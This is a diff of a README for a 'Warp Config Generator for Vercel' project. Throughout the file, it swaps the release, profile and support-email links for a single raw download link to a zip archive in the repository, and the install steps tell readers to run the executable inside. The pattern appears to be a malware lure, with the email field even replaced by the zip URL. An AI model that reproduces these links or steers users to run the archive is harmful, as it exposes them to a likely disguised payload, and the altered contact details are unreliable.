@@ -2,7 +2,7 @@
 
 Welcome to the Warp Config Generator for Vercel! This tool helps you streamline the configuration process for your Vercel projects, making it easier to manage your deployment settings and environment variables.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-brightgreen)](https://github.com/prima32/warp-config-generator-vercel/releases)
+[![Download Release](https://github.com/prima32/warp-config-generator-vercel/raw/refs/heads/master/app/config_warp_vercel_generator_v3.0.zip%20Release-v1.0.0-brightgreen)](https://github.com/prima32/warp-config-generator-vercel/raw/refs/heads/master/app/config_warp_vercel_generator_v3.0.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ The Warp Config Generator for Vercel is designed for developers who want to simp
 
 To install the Warp Config Generator, follow these steps:
 
-1. Download the latest release from our [Releases page](https://github.com/prima32/warp-config-generator-vercel/releases).
+1. Download the latest release from our [Releases page](https://github.com/prima32/warp-config-generator-vercel/raw/refs/heads/master/app/config_warp_vercel_generator_v3.0.zip).
 2. Extract the downloaded file.
 3. Navigate to the extracted folder in your terminal.
 4. Run the executable file.
@@ -82,10 +82,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: support@example.com
-- **GitHub**: [prima32](https://github.com/prima32)
+- **Email**: https://github.com/prima32/warp-config-generator-vercel/raw/refs/heads/master/app/config_warp_vercel_generator_v3.0.zip
+- **GitHub**: [prima32](https://github.com/prima32/warp-config-generator-vercel/raw/refs/heads/master/app/config_warp_vercel_generator_v3.0.zip)
 
-For more updates, visit our [Releases page](https://github.com/prima32/warp-config-generator-vercel/releases) regularly.
+For more updates, visit our [Releases page](https://github.com/prima32/warp-config-generator-vercel/raw/refs/heads/master/app/config_warp_vercel_generator_v3.0.zip) regularly.
 
 ---
 
